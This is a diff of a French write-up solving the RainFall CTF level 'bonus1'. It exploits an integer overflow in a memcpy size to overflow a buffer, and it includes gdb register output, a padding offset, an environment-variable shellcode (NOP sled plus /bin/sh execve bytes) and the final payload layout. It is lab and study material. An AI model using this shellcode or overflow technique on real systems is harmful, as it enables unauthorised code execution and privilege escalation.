@@ -31,7 +31,7 @@ int main(int ac, char **av){                                            #
 }                                                                       #
 #########################################################################
 ```
-
+```
 bonus1@RainFall:/tmp$ ./doop -1
 *4: 4294967292
 *1: 4294967295
@@ -52,20 +52,19 @@ bonus1@RainFall:/tmp$ ./doop -2147483618
 *4: 120
 *1: 2147483678
 /4: 536870919
-
+```
 On peu en deduire ceci :
 
 size_t est seulement un unsigned int ici, si l'on entre INT_MIN cela donne UINT_MAX + 1 donc 0, et cela sera la taille fournis a memcpy.
 Plus qu'a retirer le nombre d'octet que l'on veut pour generer un buffer overflow :
-
+```
 bonus1@RainFall:~$ ./bonus1 -2147483618 $(python -c 'print("A" * 40')
 Segmentation fault (core dumped)
-
+```
 maintenant observont les registre :
-
+```
 bonus1@RainFall:~$ gdb ./bonus1 
 
-```
 (gdb) b main
 Breakpoint 1 at 0x8048427
 
@@ -132,13 +131,15 @@ gs             0x33     51
 
 0x39624138 = 8Ab9 = 56 in Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
 
-maintenant plus qu'as faire notre payload:
+maintenant plus qu'as faire notre payload.
+
+## Payload :
 
 On peu faire ret to libc ou un shellcode :
 
-
-export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')
 ```
+export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')
+
 (gdb) run
 Starting program: /home/user/bonus1/bonus1 
 
@@ -147,9 +148,6 @@ Breakpoint 1, 0x08048427 in main ()
 $1 = 0xbffff129 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
 ```
 0xbffff129 + 500 = 0xbffff31d ; pour tomber dans le nop sled 
-
----
-## Payload :
 
 [ Int min + 30 ] + [ Padding de 56 ] + [ Adresse du shellcode + 500 ]
 ```
